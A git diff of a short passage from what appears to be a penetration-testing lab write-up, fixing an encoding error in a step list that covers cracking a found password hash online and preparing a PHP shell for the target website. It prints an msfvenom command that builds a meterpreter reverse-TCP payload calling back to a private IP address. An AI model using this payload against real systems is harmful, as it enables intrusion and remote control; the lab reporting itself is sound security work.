@@ -17,7 +17,7 @@ I created mitigation measures for each exploit that I've successfully performed.
 
 -	I then logged into the secret folder and found a personal note in it.
 
--	After reading the personal note, I copied the hashed text that was was left for Ryanâ€™s account and put it on https://crackstation.net/ and cracked it on the website.
+-	After reading the personal note, I copied the hashed text that was was left for Ryan's account and put it on https://crackstation.net/ and cracked it on the website.
 
 
 -	Now that I have username and password for Ryan, I can now create my php shell to put on their website. I did so by doing this command msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=80 -f raw > shell.php
